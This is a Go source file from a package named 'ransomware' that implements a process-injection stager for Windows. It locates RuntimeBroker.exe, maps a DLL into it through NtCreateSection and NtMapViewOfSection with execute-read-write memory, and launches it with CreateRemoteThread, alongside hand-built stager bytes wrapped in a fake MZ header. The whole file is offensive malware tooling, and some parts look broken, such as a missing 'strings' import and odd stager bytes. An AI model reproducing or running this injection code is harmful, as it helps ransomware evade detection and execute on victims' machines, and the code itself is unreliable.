package ransomware

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type ReflectiveStager struct {
	config        *RansomwareConfig
	shellcode     []byte
	stagerSize    int
	targetProcess string
}

const (
	MEM_COMMIT    = 0x1000
	MEM_RESERVE   = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READWRITE = 0x04
	SECTION_MAP_READ    = 0x0004
	SECTION_MAP_WRITE   = 0x0002
	SECTION_MAP_EXECUTE = 0x0008

	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_QUERY_INFORMATION = 0x0400
)

var (
	ntdll           = windows.MustLoadDLL("ntdll.dll")
	kernel32        = windows.MustLoadDLL("kernel32.dll")
	ntCreateSection = ntdll.MustFindProc("NtCreateSection")
	ntMapViewOfSection = ntdll.MustFindProc("NtMapViewOfSection")
	ntUnmapViewOfSection = ntdll.MustFindProc("NtUnmapViewOfSection")
)

func NewReflectiveStager(cfg *RansomwareConfig) *ReflectiveStager {
	return &ReflectiveStager{
		config:        cfg,
		stagerSize:    100,
		targetProcess: "RuntimeBroker.exe",
	}
}

func (r *ReflectiveStager) GenerateNASMStager() []byte {
	nasm := make([]byte, r.stagerSize)

	offset := 0

	nasm[offset] = 0xE9
	nasm[offset+1] = 0x2A
	nasm[offset+2] = 0x00
	nasm[offset+3] = 0x00
	nasm[offset+4] = 0x00
	offset += 5

	copy(nasm[offset:offset+4], []byte{0x58, 0x34, 0x30, 0x34})
	nasm[offset+4] = 0x58
	offset += 5

	nasm[offset] = 0x50
	nasm[offset+1] = 0x51
	nasm[offset+2] = 0x52
	nasm[offset+3] = 0x53
	offset += 4

	nasm[offset] = 0x48
	nasm[offset+1] = 0x83
	nasm[offset+2] = 0xEC
	nasm[offset+3] = 0x28
	offset += 4

	nasm[offset] = 0x48
	nasm[offset+1] = 0x8D
	nasm[offset+2] = 0x0D
	offset += 3

	binary.LittleEndian.PutUint32(nasm[offset:offset+4], uint32(r.stagerSize-10))
	offset += 4

	nasm[offset] = 0x48
	nasm[offset+1] = 0x83
	nasm[offset+2] = 0xC4
	nasm[offset+3] = 0x28
	offset += 4

	nasm[offset] = 0x5B
	nasm[offset+1] = 0x5A
	nasm[offset+2] = 0x59
	nasm[offset+3] = 0x58
	offset += 4

	nasm[offset] = 0xE9
	offset++

	binary.LittleEndian.PutUint32(nasm[offset:offset+4], uint32(0xFFFFFFD6))
	offset += 4

	r.shellcode = nasm[:offset]

	return r.shellcode
}

func (r *ReflectiveStager) InjectViaSection(targetPID uint32, dllData []byte) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("reflective injection requires Windows")
	}

	targetHandle, err := windows.OpenProcess(
		windows.PROCESS_ALL_ACCESS, false, targetPID)
	if err != nil {
		return fmt.Errorf("open target process %d: %w", targetPID, err)
	}
	defer windows.CloseHandle(targetHandle)

	var sectionHandle windows.Handle
	size := int64(len(dllData))

	ret, _, _ := ntCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		uintptr(0x000F000F),
		0,
		uintptr(unsafe.Pointer(&size)),
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("NtCreateSection failed: 0x%X", ret)
	}
	defer windows.CloseHandle(sectionHandle)

	var localBase uintptr
	localSize := uintptr(len(dllData))

	ret, _, _ = ntMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&localBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&localSize)),
		2,
		0,
		uintptr(PAGE_READWRITE))
	if ret != 0 {
		return fmt.Errorf("NtMapViewOfSection (local) failed: 0x%X", ret)
	}
	defer ntUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localBase)

	copy((*[1 << 30]byte)(unsafe.Pointer(localBase))[:len(dllData)], dllData)

	var remoteBase uintptr
	remoteSize := uintptr(len(dllData))

	ret, _, _ = ntMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(targetHandle),
		uintptr(unsafe.Pointer(&remoteBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&remoteSize)),
		2,
		0,
		uintptr(PAGE_EXECUTE_READWRITE))
	if ret != 0 {
		return fmt.Errorf("NtMapViewOfSection (remote) failed: 0x%X", ret)
	}

	r.ExecuteReflectiveLoader(targetHandle, remoteBase)

	return nil
}

func (r *ReflectiveStager) ExecuteReflectiveLoader(processHandle windows.Handle, remoteBase uintptr) error {
	kernel32DLL := windows.MustLoadDLL("kernel32.dll")
	createRemoteThread := kernel32DLL.MustFindProc("CreateRemoteThread")

	var threadID uint32
	ret, _, _ := createRemoteThread.Call(
		uintptr(processHandle),
		0,
		0,
		remoteBase,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)

	if ret == 0 {
		return fmt.Errorf("CreateRemoteThread failed")
	}

	return nil
}

func (r *ReflectiveStager) FindTargetProcess(processName string) (uint32, error) {
	cmd := exec.Command("tasklist", "/FI", "IMAGENAME eq "+processName, "/FO", "CSV", "/NH")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return 0, err
	}

	lines := stringsSplit(string(out), "\n")
	if len(lines) == 0 {
		return 0, fmt.Errorf("process %s not found", processName)
	}

	parts := stringsSplit(strings.Trim(lines[0], "\"\r\n"), "\",\"")
	if len(parts) < 2 {
		return 0, fmt.Errorf("cannot parse tasklist output")
	}

	pidStr := strings.Trim(parts[1], "\"")
	return uint32(atoi(pidStr)), nil
}

func (r *ReflectiveStager) ReflectiveLoadDLL(dllPath string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	dllData, err := os.ReadFile(dllPath)
	if err != nil {
		return err
	}

	pid, err := r.FindTargetProcess(r.targetProcess)
	if err != nil {
		pid = uint32(os.Getpid())
	}

	return r.InjectViaSection(pid, dllData)
}

func (r *ReflectiveStager) GenerateStagerShellcode() []byte {
	stager := r.GenerateNASMStager()

	mzHeader := []byte{
		0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
		0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
		0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x40, 0x00, 0x00, 0x00,
	}

	stagerSizeOffset := 0x18
	binary.LittleEndian.PutUint16(mzHeader[stagerSizeOffset:stagerSizeOffset+2], uint16(len(stager)))

	result := make([]byte, len(mzHeader)+len(stager))
	copy(result, mzHeader)
	copy(result[len(mzHeader):], stager)

	return result
}

func (r *ReflectiveStager) FullReflectiveSuite(dllPath string) map[string]interface{} {
	result := make(map[string]interface{})

	stager := r.GenerateNASMStager()
	result["stager_size"] = len(stager)

	if runtime.GOOS == "windows" {
		pid, err := r.FindTargetProcess(r.targetProcess)
		if err != nil {
			result["target_error"] = err.Error()
		} else {
			result["target_pid"] = pid
			result["target_process"] = r.targetProcess
		}

		if dllPath != "" {
			if _, err := os.Stat(dllPath); err == nil {
				if err := r.ReflectiveLoadDLL(dllPath); err != nil {
					result["injection_error"] = err.Error()
				} else {
					result["injection"] = "success"
				}
			} else {
				result["dll_not_found"] = dllPath
			}
		}
	}

	result["method"] = "NtCreateSection + NtMapViewOfSection"
	return result
}

func stringsSplit(s, sep string) []string {
	if sep == "" {
		return []string{s}
	}
	var result []string
	for {
		idx := indexOf(s, sep)
		if idx < 0 {
			result = append(result, s)
			break
		}
		result = append(result, s[:idx])
		s = s[idx+len(sep):]
	}
	return result
}

func indexOf(s, substr string) int {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func atoi(s string) int {
	var n int
	for _, c := range s {
		if c >= '0' && c <= '9' {
			n = n*10 + int(c-'0')
		}
	}
	return n
}

var (
	_ = bytes.NewBuffer
	_ = syscall.StringToUTF16
	_ = unsafe.Sizeof(0)
)
